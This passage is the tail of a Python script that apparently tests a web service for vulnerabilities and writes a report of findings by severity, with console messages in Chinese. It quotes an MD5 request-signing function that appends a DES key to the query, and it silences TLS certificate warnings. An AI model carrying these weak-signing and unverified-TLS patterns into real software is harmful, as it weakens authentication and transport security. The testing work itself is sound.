                  "    query = '&'.join(parts) + f'&DESKey={DES_KEY}'\n"
                  "    return hashlib.md5(query.encode()).hexdigest()\n"
                  "```\n")

    report_text = "\n".join(report)
    with open(REPORT_FILE, "w", encoding="utf-8") as f:
        f.write(report_text)

    print(f"  报告已生成: {REPORT_FILE}")
    print(f"\n{'=' * 70}")
    print(f"测试完成! 共 {total_tests} 项, {vulnerable_count} 项发现隐患")
    if vulnerable_count > 0:
        print(f"  严重: {len(vuln_by_severity['CRITICAL'])}, 高危: {len(vuln_by_severity['HIGH'])}, 中危: {len(vuln_by_severity['MEDIUM'])}")
    print(f"{'=' * 70}")


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    run_all_tests()
